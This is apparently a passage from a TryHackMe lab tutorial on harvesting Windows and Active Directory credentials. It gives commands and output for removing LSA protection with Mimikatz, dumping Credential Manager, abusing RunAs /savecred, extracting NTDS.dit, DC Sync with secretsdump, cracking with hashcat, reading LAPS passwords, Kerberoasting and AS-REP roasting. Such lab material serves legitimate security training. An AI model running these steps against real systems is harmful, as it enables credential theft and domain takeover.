[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

Note: If this fails with an `isFileExist` error, exit mimikatz, navigate to `C:\Tools\Mimikatz\` and run the command again.

Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:

Removing the LSA Protection

```markup
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```

Now, if we try to run the "sekurlsa::logonpasswords" command again, 
it must be executed successfully and show cached credentials in memory.

**Windows Credential Manager**

This
 task introduces the Windows Credential Manager and discusses the 
technique used for dumping system credentials by exploiting it.

# What is Credentials Manager?

Credential
 Manager is a Windows feature that stores logon-sensitive information 
for websites, applications, and networks. It contains login credentials 
such as usernames, passwords, and internet addresses. There are four 
credential categories:

- Web credentials contain authentication details stored in Internet browsers or other applications.
- Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
- Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
- Certificate-based credentials: Athunticated details based on certifications.

Note
 that authentication details are stored on the user's folder and are not
 shared among Windows user accounts. However, they are cached in memory.

# Accessing Credential Manager

We can access the Windows Credential Manager through GUI
 (Control Panel -> User Accounts -> Credential Manager) or the 
command prompt. In this task, the focus will be more on the command 
prompt scenario where the GUI is not available.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ee895dc640303b236e795c1f7e5df7a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ee895dc640303b236e795c1f7e5df7a.png)

We will be using the Microsoft Credentials Manager `vaultcmd`
 utility. Let's start to enumerate if there are any stored credentials. 
First, we list the current windows vaults available in the Windows 
target.

Listing the Available Credentials from the Credentials Manager

```markup
C:\Users\Administrator>vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
```

By default, Windows has two vaults, one for Web and the 
other one for Windows machine credentials. The above output confirms 
that we have the two default vaults.

Let's check if there are any stored credentials in the Web Credentials vault by running the vaultcmd command with `/listproperties`.

Checking if there Are any Stored Credentials in the "Web Credentials."

```markup
C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
Vault Properties: Web Credentials
Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
Number of credentials: 1
Current protection method: DPAPI
```

The output shows that we have one stored credential in the specified 
vault. Now let's try to list more information about the stored 
credential as follows,

Listing Credentials Details for "Web Credentials"

```markup
C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
Credentials in vault: Web Credentials

Credential schema: Windows Web Password Credential
Resource: internal-app.thm.red
Identity: THMUser Saved By: MSEdge
Hidden: No
Roaming: Yes
```

# Credential Dumping

The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1), which is already included in the attached VM.

Ensure to execute PowerShell with bypass policy to import it as a module as follows,

Getting Clean-text Password from Web Credentials

```markup
C:\Users\Administrator>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials

UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
```

The output shows that we obtained the username and password for accessing the internal application.

# RunAs

An
 alternative method of taking advantage of stored credentials is by 
using RunAs. RunAs is a command-line built-in tool that allows running 
Windows applications or tools under different users' permissions. The 
RunAs tool has various command arguments that could be used in the 
Windows system. The `/savecred` argument allows you to save 
the credentials of the user in Windows Credentials Manager (under the 
Windows Credentials section). So, the next time we execute as the same 
user, runas will not ask for a password.

Let's apply it to the attached Windows machine. Another way to enumerate stored credentials is by using `cmdkey`, which is a tool to create, delete, and display stored Windows credentials. By providing the `/list` argument, we can show all stored credentials, or we can specify the credential to display more details `/list:computername`.

Enumerating for Stored Windows Credentials

```markup
C:\Users\thm>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=thm\thm-local
    Type: Domain Password
    User: thm\thm-local
```

The output shows that we have a domain password stored as the

```
thm\thm-local
```

user. Note that stored credentials could be for other servers too. Now let's use runas to execute Windows applications as the

```
thm-local
```

user.

Run CMD.exe As a User with the /savecred argument

```markup
C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user "THM.red\thm-local" ...
```

A new cmd.exe pops up with a command prompt ready to use. Now run 
the whoami command to confirm that we are running under the desired 
user. There is a flag in the

```
c:\Users\thm-local\Saved Games\flag.txt
```

, try to read it and answer the question below.

# Mimikatz

Mimikatz
 is a tool that can dump clear-text passwords stored in the Credential 
Manager from memory. The steps are similar to those shown in the 
previous section (Memory dump), but we can specify to show the 
credentials manager section only this time.

Dumping Memory for Credentials Manager

```markup
C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman
```

Apply this technique to the attached machine and answer the question below.

The techniques discussed in this task also could be done through other tools such as Empire, Metasploit, etc. You can do your own research to expand your knowledge.

**Domain Controller**

This task discusses the required steps to dump Domain Controller Hashes locally and remotely.

# NTDS Domain Controller

New
 Technologies Directory Services (NTDS) is a database containing all 
Active Directory data, including objects, attributes, credentials, etc. 
The NTDS.DTS data consists of three tables as follows:

- Schema table: it contains types of objects and their relationships.
- Link table: it contains the object's attributes and their values.
- Data type: It contains users and groups.

NTDS is located in `C:\Windows\NTDS`
 by default, and it is encrypted to prevent data extraction from a 
target machine. Accessing the NTDS.dit file from the machine running is 
disallowed since the file is used by Active Directory and is locked. 
However, there are various ways to gain access to it. This task will 
discuss how to get a copy of the NTDS file using the ntdsutil and 
Diskshadow tool and finally how to dump the file's content. It is 
important to note that decrypting the NTDS file requires a system Boot 
Key to attempt to decrypt LSA Isolated credentials, which is stored in 
the `SECURITY` file system. Therefore, we must also dump the security file containing all required files to decrypt.

# Ntdsutil

Ntdsutil
 is a Windows utility to used manage and maintain Active Directory 
configurations. It can be used in various scenarios such as

- Restore deleted objects in Active Directory.
- Perform maintenance for the AD database.
- Active Directory snapshot management.
- Set Directory Services Restore Mode (DSRM) administrator passwords.

For more information about Ntdsutil, you may visit the Microsoft documentation [page](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)).

# Local Dumping (No Credentials)

This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore,
 we will be relying on Windows utilities to dump the NTDS file and crack
 them offline. As a requirement, first, we assume we have administrator 
access to a domain controller.

To successfully dump the content of the NTDS file we need the following files:

- C:\Windows\NTDS\ntds.dit
- C:\Windows\System32\config\SYSTEM
- C:\Windows\System32\config\SECURITY

The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the `C:\temp` directory.

Dumping the content of the NTDS file from the Victim Machine

```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

```

Now, if we check the `c:\temp`
 directory, we see two folders: Active Directory and registry, which 
contain the three files we need. Transfer them to the AttackBox and run 
the secretsdump.py script to extract the hashes from the dumped memory 
file.

Extract hashes from NTDS Locally

```
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```

# Remote Dumping (With Credentials)

In the previous section, we discussed how to get hashes from memory with no credentials in hand. In
 this task, we will be showing how to dump a system and domain 
controller hashes remotely, which requires credentials, such as 
passwords or NTLM
 hashes. We also need credentials for users with administrative access 
to a domain controller or special permissions as discussed in the DC 
Sync section.

# DC

The DC
 Sync is a popular attack to perform within an Active Directory 
environment to dump credentials remotely. This attack works when an 
account (special account with necessary permissions) or AD admin account
 is compromised that has the following AD permissions:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set

An adversary takes advantage of these configurations to perform domain replication, commonly referred to as "DC Sync", or Domain Controller Sync. For more information about the DC Sync attack, you can visit the THM [Persisting AD](https://tryhackme.com/room/persistingad) room (Task 2).

The Persisting AD
 room uses the Mimikatz tool to perform the DC Synchronisation attack. 
Let's demonstrate the attack using a different tool, such as the Impacket SecretsDump script.

Performing the DC Sync Attack

```
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@MACHINE_IP
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
```

Let's explain the command a bit more.

- the `just-dc` argument is for extracting the NTDS data.
- the `thm.red/AD_Admin_User` is the authenticated domain user in the form of (domain/user).

Note if we are interested to dump only the NTLM hashes, then we can use the `-just-dc-ntlm` argument as follows,

The DC Sync Attack to Dump NTLM Hashes

```
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@MACHINE_IP
```

Once we obtained hashes, we can either use the hash for a specific 
user to impersonate him or crack the hash using Cracking tools, such `hashcat`. We can use the hashcat `-m 1000` mode to crack the Windows NTLM hashes as follows:

Cracking the Hashes

```
user@machine$ hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt
```

**Local Administrator Password Solution (LAPS)**

# This task discusses how to enumerate and obtain a local administrator
password within the Active Directory environment if a LAPS feature is
configured and enabled.

# Group Policy Preferences (GPP)

A Windows OS
 has a built-in Administrator account which can be accessed using a 
password. Changing passwords in a large Windows environment with many 
computers is challenging. Therefore, Microsoft implemented a method to 
change local administrator accounts across workstations using Group 
Policy Preferences (GPP).

GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML
 files are created in the SYSVOL folder. SYSVOL is an essential 
component of Active Directory and creates a shared directory on an NTFS 
volume that all authenticated domain users can access with reading 
permission.

The issue was the GPP relevant XML
 files contained a password encrypted using AES-256 bit encryption. At 
that time, the encryption was good enough until Microsoft somehow 
published its private key on [MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN).
 Since Domain users can read the content of the SYSVOL folder, it 
becomes easy to decrypt the stored passwords. One of the tools to crack 
the SYSVOL encrypted password is [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1).

# Local Administrator Password Solution (LAPS)

In
 2015, Microsoft removed storing the encrypted password in the SYSVOL 
folder. It introduced the Local Administrator Password Solution (LAPS), 
which offers a much more secure approach to remotely managing the local 
administrator password.

The new 
method includes two new attributes (ms-mcs-AdmPwd and 
ms-mcs-AdmPwdExpirationTime) of computer objects in the Active 
Directory. The `ms-mcs-AdmPwd` attribute contains a clear-text password of the local administrator, while the `ms-mcs-AdmPwdExpirationTime` contains the expiration time to reset the password. LAPS uses `admpwd.dll` to change the local administrator password and update the value of `ms-mcs-AdmPwd`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ecdb1fcaee158d79297978a49d52b9dd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ecdb1fcaee158d79297978a49d52b9dd.png)

# Enumerate for LAPS

The provided VM
 has the LAPS enabled, so let's start enumerating it. First, we check if
 LAPS is installed in the target machine, which can be done by checking 
the `admpwd.dll` path.

Enumerating for LAPS

```
C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\LAPS\CSE

06/06/2022  01:01 PM              .
06/06/2022  01:01 PM              ..
05/05/2021  07:04 AM           184,232 AdmPwd.dll
               1 File(s)        184,232 bytes
               2 Dir(s)  10,306,015,232 bytes free
```

The output confirms that we have LAPS on the machine. Let's check the available commands to use for `AdmPwd` cmdlets as follows,

Listing the available PowerShell cmdlets for LAPS

```
PS C:\Users\thm> Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS
```

Next, we need to find which AD
 organizational unit (OU) has the "All extended rights" attribute that 
deals with LAPS. We will be using the "Find-AdmPwdExtendedRights" cmdlet
 to provide the right OU. Note that getting the available OUs could be 
done in the enumeration step. Our OU target in this example is `THMorg`. You can use the `-Identity *`  argument to list all available OUs.

Finding Users with AdmPwdExtendedRights Attribute

```
PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\THMGroupReader}
```

The output shows that the `THMGroupReader` group in `THMorg` has the right access to LAPS. Let's check the group and its members.

Finding Users belong to THMGroupReader Group

```
PS C:\Users\thm> net groups "THMGroupReader"
Group name     THMGroupReader
Comment

Members

-------------------------------------------------------------------------------
bk-admin
The command completed successfully.

PS C:\Users\victim> net user test-admin
User name                    test-admin
Full Name                    THM Admin Test Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

[** Removed **]
Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
                             *THMGroupReader           *Enterprise Admins
The command completed successfully.
```

# Getting the Password

We found that the `bk-admin` user is a member of `THMGroupReader`,
 so in order to get the LAPS password, we need to compromise or 
impersonate the bk-admin user. After compromising the right user, we can
 get the LAPS password using `Get-AdmPwdPassword` cmdlet by providing the target machine with LAPS enabled.

Getting LAPS Password with the Right User

```
PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword    2/11/2338 11:05:2...
```

It is important to note that in a real-world AD
 environment, the LAPS is enabled on specific machines only. Thus, you 
need to enumerate and find the right target computer as well as the 
right user account to be able to get the LAPS password. There are many 
scripts to help with this, but we included the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) PowerShell script in  `C:\Tool` to try it out.

**Other Attacks**

In the previous tasks, 
the assumption is that we already had initial access to a system and 
were trying to obtain credentials from memory or various files within 
the Windows operating system. In other scenarios, it is possible to 
perform attacks in a victim network to obtain credentials.

This task will briefly introduce some of the Windows and AD attacks that can be used to obtain the hashes. Before diving into more AD attack details, we suggest being familiar with [Kerberos protocol](https://en.wikipedia.org/wiki/Kerberos_(protocol)) and New Technology LAN Manager (NTLM), a suite of security protocols used to authenticate users.

# Kerberoasting

Kerberoasting is a common AD
 attack to obtain AD tickets that helps with persistence. In order for 
this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS). This attack's end goal is to enable privilege escalation and lateral network movement. For more details about the attack, you can visit the THM [Persisting AD](https://tryhackme.com/room/persistingad) room (Task 3).

Let's
 do a quick demo about the attack. First, we need to find an SPN 
account(s), and then we can send a request to get a TGS ticket. We will 
perform the Kerberoasting attack from the AttackBox using the GetUserSPNs.py python script. Remember to use the THM.red/thm account with Passw0rd! as a password.

Enumerating for SPN Accounts

```
user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thmImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578
```

The previous command is straightforward: we provide the Domain 
Controller IP address and the domain name\username. Then the GetUserSPNs
 script asks for the user's password to retrieve the required 
information.

The output revealed that we have an SPN account, 
svc-user. Once we find the SPN user, we can send a single request to get
 a TGS ticket for the srv-user user using the -request-user argument.

Requesting a TGS Ticket as SPN Account

```
user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm -request-user svc-user Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578

[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[*REMOVED*]7bfa3680658dd9812ac061c5
```

Now, it is a matter of cracking the obtained TGS ticket using the HashCat tool using `-m 13100` mode as follows,

Cracking the TGS Ticket using Hashcat

```
user@machine$ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

Try replicating the steps against the attached VM
 by finding the SPN user and then performing the Kerberoasting attack. 
Once you have obtained the ticket, crack it and answer the question 
below.

# AS-REP Roasting

AS-REP Roasting is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "Do not require Kerberos pre-authentication". This option relies on the old Kerberos authentication protocol, which allows
 authentication without a password. Once we obtain the hashes, we can 
try to crack it offline, and finally, if it is crackable, we got a 
password!

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/81bf1dad6425f8f06b0026f4e748f193.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/81bf1dad6425f8f06b0026f4e748f193.png)

The attached VM
 has one of the AD users configured with the "Do not require Kerberos 
preauthentication" setting. Before performing the AS-REP Roasting, we 
need a list of domain accounts that should be gathered from the 
enumeration step. In our case, we created a `users.lst` list in the tmp directory. The following is the content of our list, which should be gathered during the enumeration process.

```markup
Administrator
admin
thm
test
sshd
victim
CREDS-HARVESTIN$
```

We will be using the Impacket Get-NPUsers script this time as follows,

Performing an AS-REP Roasting Attack against Users List

```
root@machine$ python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txtImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$victim@THM.RED:166c95418fb9dc495789fe9[**REMOVED**]1e8d2ef27$6a0e13abb5c99c07[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bk-admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-user doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User thm-local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We specified the IP address of the domain controller with the `-dc-ip`
 argument and provided a list of domain users to check against. Once the
 tool finds the right user with no preauthentication configuration, it 
will generate the ticket.

Various cybersecurity and hacking tools 
also allow cracking the TGTs harvested from Active Directory, including 
Rubeus and Hashcat. Impacket GetNPUsers has the option to export tickets
 as John or hashcat format using the `-format` argument.

# SMB

The SMB
 Relay attack abuses the NTLM authentication mechanism (NTLM 
challenge-response protocol). The attacker performs a Man-in-the-Middle 
attack to monitor and capture SMB packets and extract hashes. For this 
attack to work, the SMB signing must be disabled. SMB signing is a 
security check for integrity and ensures the communication is between 
trusted sources.

We suggest checking the THM [Exploiting AD](https://tryhackme.com/room/exploitingad) room for more information about the SMB relay attack.

# LLMNRNBNS Poisoning

Link-Local Multicast Name Resolution (LLMNR)
 and NetBIOS Name Service (NBT-NS) help local network machines to find 
the right machine if DNS fails. For example, suppose a machine within 
the network tries to communicate with no existing DNS record (DNS fails 
to resolve). In that case, the machine sends multicast messages to all 
network machines asking for the correct address via LLMNR or NBT-NS.

The NBNS/LLMNR Poisoning occurs when an attacker spoofs an authoritative source on the network and responds to the Link-Local Multicast Name Resolution (LLMNR)
 and NetBIOS Name Service (NBT-NS) traffic to the requested host with 
host identification service. If you want to learn more about the attack,
 we suggest checking THM [Breaching AD](https://tryhackme.com/room/breachingad) room.

The end goal for SMB
 relay and LLMNR/NBNS Poisoning attacks is to capture authentication 
NTLM hashes for a victim, which helps obtain access to the victim's 
account or machine.


